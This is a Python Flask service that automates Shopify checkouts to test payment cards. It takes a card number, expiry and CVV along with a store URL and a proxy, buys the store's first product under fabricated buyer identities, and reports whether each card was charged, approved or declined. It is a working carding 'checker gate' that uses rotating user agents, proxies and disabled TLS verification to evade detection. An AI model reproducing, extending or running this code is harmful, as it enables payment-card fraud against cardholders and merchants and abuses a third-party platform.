import asyncio
import random
import time
import re
from fake_useragent import UserAgent
import httpx
from urllib.parse import urlparse
from flask import Flask, request, jsonify
from collections import OrderedDict

app = Flask(__name__)

DEVELOPER_NAME     = "Freska"
DEVELOPER_USERNAME = "@zqzcz"

RESPONSE_ORDER = [
    "Charged", "Approved", "Declined", "Error",
    "CC", "Response", "Gate", "Price",
    "Site", "Proxy", "Time", "Developer", "Developer_Username"
]

def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""

def build_response(res_data):
    ordered = OrderedDict()
    for k in RESPONSE_ORDER:
        if k in res_data:
            ordered[k] = res_data[k]
    return ordered

def parse_proxy(proxy_str):
    """
    Accepts:  ip:port:user:pass
    Returns:  httpx proxy URL string  or  None
    """
    if not proxy_str or proxy_str.strip().lower() == "none":
        return None
    try:
        parts = proxy_str.strip().split(":")
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return f"http://{user}:{pwd}@{ip}:{port}"
        elif len(parts) == 2:
            ip, port = parts
            return f"http://{ip}:{port}"
        return None
    except:
        return None

class ShopifyAuto:
    def __init__(self):
        self.user_agent = UserAgent().random

    async def get_random_info(self):
        us_addresses = [
            {"add1": "123 Main St",  "city": "Portland", "state_short": "ME", "zip": "04101"},
            {"add1": "456 Oak Ave",  "city": "Portland", "state_short": "ME", "zip": "04102"},
            {"add1": "789 Pine Rd",  "city": "Portland", "state_short": "ME", "zip": "04103"},
            {"add1": "321 Elm St",   "city": "Bangor",   "state_short": "ME", "zip": "04401"},
            {"add1": "654 Maple Dr", "city": "Lewiston", "state_short": "ME", "zip": "04240"},
        ]
        address    = random.choice(us_addresses)
        first_name = random.choice(["John","Emily","Alex","Sarah","Michael","Jessica","David","Lisa"])
        last_name  = random.choice(["Smith","Johnson","Williams","Brown","Garcia","Miller","Davis"])
        email      = f"{first_name.lower()}.{last_name.lower()}{random.randint(1,999)}@gmail.com"
        phone      = random.choice([
            "2025550199","3105551234","4155559876","6175550123",
            "9718081573","2125559999","7735551212","4085556789"
        ])
        return {
            "fname": first_name, "lname": last_name,
            "email": email,      "phone": phone,
            "add1": address["add1"], "city": address["city"],
            "state_short": address["state_short"], "zip": str(address["zip"]),
        }

    async def check_card(self, cc_full, site_url, proxy_url=None):
        start_time = time.time()

        proxy_display = proxy_url if proxy_url else "None"

        res_data = {
            "Charged":            "False",
            "Approved":           "False",
            "Declined":           "False",
            "Error":              "False",
            "CC":                 cc_full,
            "Response":           "UNKNOWN_ERROR",
            "Gate":               "Shopify Payments",
            "Price":              "N/A",
            "Site":               site_url,
            "Proxy":              proxy_display,
            "Time":               "0.00s",
            "Developer":          DEVELOPER_NAME,
            "Developer_Username": DEVELOPER_USERNAME,
        }

        def finalize(resp_text, *, approved=False, charged=False, declined=False, error=False):
            res_data["Response"] = resp_text
            res_data["Approved"] = "True" if approved or charged else "False"
            res_data["Charged"]  = "True" if charged  else "False"
            res_data["Declined"] = "True" if declined else "False"
            res_data["Error"]    = "True" if error    else "False"
            res_data["Time"]     = f"{time.time() - start_time:.2f}s"
            return build_response(res_data)

        # Parse card
        try:
            cc, mon, year, cvv = cc_full.split('|')
            if len(year) == 2:
                year = '20' + year
        except:
            return finalize("INVALID_CC_FORMAT", error=True)

        # Build client kwargs — proxy injected here, flows into every request
        client_kwargs = {
            "follow_redirects": True,
            "timeout": 45.0,
            "verify": False,
        }
        if proxy_url:
            client_kwargs["proxy"] = proxy_url

        async with httpx.AsyncClient(**client_kwargs) as session:

            # ── STEP 1 : Products ──────────────────────────────────────────────
            try:
                h = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.6',
                    'user-agent': self.user_agent,
                }
                p_res    = await session.get(f"{site_url}/products.json", headers=h)
                products = p_res.json().get('products', [])
                if not products:
                    return finalize("NO_PRODUCTS_FOUND", error=True)
                p      = products[0]
                v_id   = p['variants'][0]['id']
                handle = p['handle']
                res_data["Price"] = p['variants'][0]['price']
            except:
                return finalize("ERROR : Step 1 failed", error=True)

            # ── STEP 2 : Product page + cart ──────────────────────────────────
            try:
                await session.get(f"{site_url}/products/{handle}", headers=h)
                h.update({'user-agent': UserAgent().random})
                await session.get(f"{site_url}/cart.js", headers=h)
                await session.post(
                    f"{site_url}/cart/add.js", headers=h,
                    data={'id': str(v_id), 'quantity': '1', 'form_type': 'product'}
                )
                cart_res  = await session.get(f"{site_url}/cart.js", headers=h)
                cart_data = cart_res.json()
                token     = cart_data.get('token')
                if not token:
                    return finalize("ERROR : Step 2 failed", error=True)
            except:
                return finalize("ERROR : Step 2 failed", error=True)

            # ── STEP 3 : Checkout tokens ───────────────────────────────────────
            try:
                c_h = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': site_url,
                    'referer': f"{site_url}/cart",
                    'upgrade-insecure-requests': '1',
                    'user-agent': h['user-agent'],
                }
                await session.get(f"{site_url}/checkout", headers=c_h)
                c_res = await session.post(
                    f"{site_url}/cart", headers=c_h,
                    data={'checkout': '', 'updates[]': '1'}
                )
                txt = c_res.text

                s_token_match = re.search(
                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', txt
                )
                s_token     = s_token_match.group(1) if s_token_match else find_between(txt, 'serialized-sessionToken&quot;:&quot;', '&quot;')
                queue_token = find_between(txt, 'queueToken&quot;:&quot;', '&quot;')
                stable_id   = find_between(txt, 'stableId&quot;:&quot;', '&quot;')
                p_m_id      = find_between(txt, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

                if not s_token:
                    return finalize("ERROR : Step 3 failed", error=True)
            except:
                return finalize("ERROR : Step 3 failed", error=True)

            await asyncio.sleep(1)

            # ── STEP 4 : Random info ───────────────────────────────────────────
            try:
                info        = await self.get_random_info()
                fname       = info["fname"];  lname       = info["lname"]
                email       = info["email"];  phone       = info["phone"]
                add1        = info["add1"];   city        = info["city"]
                state_short = info["state_short"]; zip_code = info["zip"]
            except:
                return finalize("ERROR : Step 4 failed", error=True)

            # ── STEP 5 : Payment session ───────────────────────────────────────
            # Payment session endpoints are external (shopifycs.com) — proxy goes here too
            try:
                pay_id = None

                # separate client for payment session — same proxy, different origin
                pay_client_kwargs = {
                    "follow_redirects": True,
                    "timeout": 45.0,
                    "verify": False,
                }
                if proxy_url:
                    pay_client_kwargs["proxy"] = proxy_url

                async with httpx.AsyncClient(**pay_client_kwargs) as pay_session:
                    for endpoint in [
                        "https://deposit.us.shopifycs.com/sessions",
                        "https://checkout.pci.shopifyinc.com/sessions",
                        "https://checkout.shopifycs.com/sessions",
                    ]:
                        try:
                            pay_h = {
                                'authority': urlparse(endpoint).netloc,
                                'accept': 'application/json',
                                'content-type': 'application/json',
                                'origin': 'https://checkout.shopifycs.com',
                                'referer': 'https://checkout.shopifycs.com/',
                                'user-agent': self.user_agent,
                            }
                            pay_res = await pay_session.post(endpoint, headers=pay_h, json={
                                'credit_card': {
                                    'number': cc, 'month': int(mon),
                                    'year': int(year), 'verification_value': cvv,
                                    'name': f"{fname} {lname}",
                                },
                                'payment_session_scope': urlparse(site_url).netloc,
                            })
                            if pay_res.status_code == 200:
                                pay_id = pay_res.json().get('id')
                                if pay_id:
                                    break
                        except:
                            continue

                if not pay_id:
                    return finalize("ERROR : Step 5 failed", error=True)
            except:
                return finalize("ERROR : Step 5 failed", error=True)

            await asyncio.sleep(1)

            # ── STEP 6 : GraphQL submitForCompletion ───────────────────────────
            try:
                g_url = f"{site_url}/checkouts/unstable/graphql"
                g_h   = {
                    'authority': urlparse(site_url).netloc,
                    'accept': 'application/json',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/json',
                    'origin': site_url,
                    'referer': f"{site_url}/",
                    'user-agent': self.user_agent,
                    'x-checkout-one-session-token': s_token,
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-source-id': token,
                }

                mutation = (
                    'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,'
                    '$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,'
                    '$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken '
                    'metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult '
                    'analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}'
                    '...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}'
                    '...on SubmitFailed{reason __typename}'
                    '...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}'
                    '...on Throttled{pollAfter pollUrl queueToken __typename}'
                    '...on CheckpointDenied{redirectUrl __typename}'
                    '...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}'
                    '__typename}}'
                    'fragment ReceiptDetails on Receipt{'
                    '...on ProcessedReceipt{id token __typename}'
                    '...on ProcessingReceipt{id pollDelay __typename}'
                    '...on ActionRequiredReceipt{id __typename}'
                    '...on FailedReceipt{id processingError{'
                    '...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}'
                    '__typename}'
                )

                random_page_id = (
                    f"{random.randint(10000000,99999999):08x}-"
                    f"{random.randint(1000,9999):04X}-"
                    f"{random.randint(1000,9999):04X}-"
                    f"{random.randint(1000,9999):04X}-"
                    f"{random.randint(100000000000,999999999999):012X}"
                )

                payload = {
                    'query': mutation,
                    'variables': {
                        'input': {
                            'checkpointData': None,
                            'sessionInput': {'sessionToken': s_token},
                            'queueToken': queue_token,
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {},
                                    },
                                    'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                                    'destination': {
                                        'streetAddress': {
                                            'address1': add1, 'address2': '',
                                            'city': city, 'countryCode': 'US',
                                            'postalCode': zip_code, 'company': '',
                                            'firstName': fname, 'lastName': lname,
                                            'zoneCode': state_short, 'phone': phone,
                                        },
                                    },
                                    'deliveryMethodTypes': ['SHIPPING'],
                                    'expectedTotalPrice': {'any': True},
                                    'destinationChanged': True,
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                            },
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id,
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{v_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{v_id}',
                                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {'any': True},
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                }],
                            },
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': p_m_id,
                                            'sessionId': pay_id,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': add1, 'address2': '',
                                                    'city': city, 'countryCode': 'US',
                                                    'postalCode': zip_code, 'company': '',
                                                    'firstName': fname, 'lastName': lname,
                                                    'zoneCode': state_short, 'phone': phone,
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                    },
                                    'amount': {'any': True},
                                    'dueAt': None,
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': add1, 'address2': '',
                                        'city': city, 'countryCode': 'US',
                                        'postalCode': zip_code, 'company': '',
                                        'firstName': fname, 'lastName': lname,
                                        'zoneCode': state_short, 'phone': phone,
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'buyerIdentity': {'presentmentCurrency': 'USD', 'countryCode': 'US'},
                                'contactInfoV2': {
                                    'emailOrSms': {'value': email, 'emailOrSmsChanged': False},
                                },
                                'marketingConsent': [{'email': {'value': email}}],
                                'shopPayOptInPhone': {'countryCode': 'US'},
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {'message': None, 'customAttributes': []},
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None, 'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                        },
                        'attemptToken': f'{token}-{random.random()}',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': f'{site_url}/checkouts/cn/{token}',
                            'pageId': random_page_id,
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }

                soft_errors = {'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS'}
                rec_id = None

                for attempt in range(2):
                    gr = await session.post(g_url, json=payload, headers=g_h)
                    if gr.status_code != 200:
                        if attempt == 0:
                            await asyncio.sleep(2); continue
                        return finalize("ERROR : Step 6 failed", error=True)

                    g_data = gr.json().get('data', {}).get('submitForCompletion', {})

                    if g_data.get('__typename') == 'Throttled':
                        return finalize("THROTTLED", declined=True)

                    if g_data.get('reason'):
                        return finalize(g_data['reason'], declined=True)

                    if g_data.get('errors'):
                        codes    = [e.get('code') for e in g_data['errors'] if 'code' in e]
                        non_soft = [c for c in codes if c not in soft_errors]
                        if non_soft:
                            return finalize(', '.join(non_soft), declined=True)
                        if attempt == 0:
                            await asyncio.sleep(2); continue
                        return finalize(', '.join(codes), declined=True)

                    rec    = g_data.get('receipt', {})
                    rec_id = rec.get('id')
                    if rec_id:
                        break

            except:
                return finalize("ERROR : Step 6 failed", error=True)

            # ── STEP 7 : Poll ──────────────────────────────────────────────────
            if rec_id:
                try:
                    poll_query = (
                        'query PollForReceipt($receiptId:ID!,$sessionToken:String!){'
                        'receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){'
                        '...ReceiptDetails __typename}}'
                        'fragment ReceiptDetails on Receipt{'
                        '...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}'
                        '...on ProcessingReceipt{id pollDelay __typename}'
                        '...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}'
                        '...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}'
                        '__typename}'
                    )
                    poll_payload = {
                        'query': poll_query,
                        'variables': {'receiptId': rec_id, 'sessionToken': s_token},
                        'operationName': 'PollForReceipt',
                    }
                    for _ in range(10):
                        await asyncio.sleep(3)
                        pr = await session.post(g_url, json=poll_payload, headers=g_h)
                        if pr.status_code != 200:
                            continue
                        rec_data = pr.json().get('data', {}).get('receipt', {})
                        t_name   = rec_data.get('__typename')

                        if t_name == 'ProcessedReceipt' or 'orderIdentity' in rec_data:
                            return finalize("CARD_CHARGED", charged=True)
                        elif t_name == 'ActionRequiredReceipt':
                            return finalize("3DS_REQUIRED", approved=True)
                        elif t_name == 'FailedReceipt':
                            code = rec_data.get('processingError', {}).get('code') or "CARD_DECLINED"
                            return finalize(code, declined=True)
                except:
                    return finalize("ERROR : Step 7 failed", error=True)

            # ── STEP 8 : Final URL fallback ────────────────────────────────────
            try:
                fr        = await session.get(f"{site_url}/checkout?from_processing_page=1&validate=true")
                final_url = str(fr.url)
                if "/thank" in final_url.lower() or "/orders/" in final_url:
                    return finalize("CARD_CHARGED", charged=True)
                else:
                    return finalize("CARD_DECLINED", declined=True)
            except:
                return finalize("ERROR : Step 8 failed", error=True)


@app.route('/check', methods=['GET'])
def check():
    cc         = request.args.get('cc')
    site       = request.args.get('site')
    proxy_raw  = request.args.get('proxy', 'None')

    if not cc or not site:
        return jsonify(OrderedDict([
            ("Charged",            "False"),
            ("Approved",           "False"),
            ("Declined",           "False"),
            ("Error",              "True"),
            ("CC",                 cc or "N/A"),
            ("Response",           "MISSING_PARAMETERS"),
            ("Gate",               "Shopify Payments"),
            ("Price",              "N/A"),
            ("Site",               site or "N/A"),
            ("Proxy",              proxy_raw),
            ("Time",               "0.00s"),
            ("Developer",          DEVELOPER_NAME),
            ("Developer_Username", DEVELOPER_USERNAME),
        ])), 400

    proxy_url = parse_proxy(proxy_raw)

    shopify = ShopifyAuto()
    loop    = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(shopify.check_card(cc, site, proxy_url))
        return jsonify(result)
    finally:
        loop.close()


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)